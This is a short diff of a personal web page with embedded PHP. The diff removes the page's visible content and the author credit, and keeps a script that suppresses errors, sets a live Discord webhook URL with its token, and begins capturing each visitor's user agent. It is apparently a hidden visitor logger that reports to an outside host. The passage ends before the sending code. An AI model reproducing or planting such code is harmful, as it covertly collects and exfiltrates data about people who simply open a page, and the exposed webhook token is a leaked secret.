@@ -8,7 +8,7 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<link rel="stylesheet" href="styles/style.css">
+
 
 <head>
 
@@ -20,33 +20,17 @@
 
 
 
-<div class="welcome">
 
-<center><h1><p>Skyy Gay 💕</p></h1></center>
 
-</div>
 
-<div class="home">
-
-	<a href="/log.html">Login</a>
-
-</div>-->
-
-<div class="me">
-
-	<a href="/me.html">About Me</a>
-
-</div>
 
 
 
 <?php
-/*
- GitHub: https://github.com/Elyasuuuuu
- Last update : 29/03/2020
-*/
+
+
 ini_set('display_errors','off');
-/*<------------- Placer le lien webhook ici ------------------>*/ 
+
 $webhook = "https://discord.com/api/webhooks/988904883044364348/DtfL-e5ntITEP12MWgGGObURtI2SN1PKCKOcsLPA0AArPafSLav4d_rlM0wVZsrnWefZ";
 
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
